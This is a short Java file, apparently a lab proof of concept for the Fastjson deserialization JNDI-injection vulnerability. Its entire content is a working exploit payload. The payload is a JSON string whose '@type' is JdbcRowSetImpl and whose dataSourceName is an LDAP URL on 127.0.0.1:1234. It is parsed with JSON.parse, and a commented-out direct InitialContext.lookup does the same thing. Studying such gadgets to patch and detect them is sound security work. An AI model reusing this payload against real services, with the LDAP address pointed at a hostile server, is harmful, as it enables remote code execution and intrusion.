import com.alibaba.fastjson.JSON;

import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDIGadgetClient {
    public static void main(String[] args) throws Exception {
        // lookup参数注入触发
//        Context context = new InitialContext();
//        context.lookup("ldap://localhost:1234/ExportObject");

        // Fastjson反序列化JNDI注入Gadget触发
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}